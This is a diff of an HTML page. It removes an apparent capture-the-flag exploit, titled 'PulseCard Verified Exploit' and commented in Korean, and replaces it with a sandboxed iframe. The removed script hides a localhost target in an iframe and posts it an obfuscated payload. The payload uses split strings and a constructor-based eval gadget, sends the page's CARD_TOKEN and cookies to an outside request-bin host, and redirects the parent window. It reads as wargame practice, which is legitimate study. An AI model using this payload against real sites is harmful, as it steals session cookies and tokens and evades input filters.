@@ -1,34 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PulseCard Verified Exploit</title>
-</head>
 <body>
-    <iframe id="targetFrame" src="http://localhost:5000/preview" style="display:none;"></iframe>
-
-    <script>
-        // 🎯 팀원님의 드림핵 Request Bin 주소
-        const myWebhook = "https://rjzmtpu.request.dreamhack.games"; 
-        const iframe = document.getElementById("targetFrame");
-
-        // [수정 완료] Webhook 주소 뒤에 토큰과 쿠키를 URL 파라미터로 붙여서 바로 fetch(GET) 하도록 구성했습니다.
-        // 문자열 쪼개기 우회 및 싱크 구조 완벽 적용!
-        const actualAttack = 
-            'window["fe" + "tch"]("' + myWebhook + '?token=" + encodeURIComponent(window["CARD_" + "TOKEN"]) + "&cookie=" + encodeURIComponent(document["co" + "ookie"]))' +
-            '["th" + "en"](r => r["te" + "xt"]())' +
-            '["th" + "en"](name => {' +
-                'window["par" + "ent"]["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name;' +
-            '});';
-
-        // [오타 수정] "con" + "structor"로 수정하여 정상적으로 Function 생성자를 호출하도록 했습니다.
-        const payload = '(Math["construc" + "tor"]["construc" + "tor"]("return eval")()(' + JSON.stringify(actualAttack) + '))';
-
-        // iframe 로드 시 지연 시간을 줄여 봇 환경에서도 안정적으로 전송되도록 처리
-        iframe.addEventListener("load", function() {
-            setTimeout(() => {
-                iframe.contentWindow.postMessage(payload, "*");
-            }, 50); // 타이밍 이슈 최소화를 위해 50ms로 조정!
-        });
-    </script>
+<iframe sandbox="allow-scripts" src="inner.html"></iframe>
 </body>
 </html>
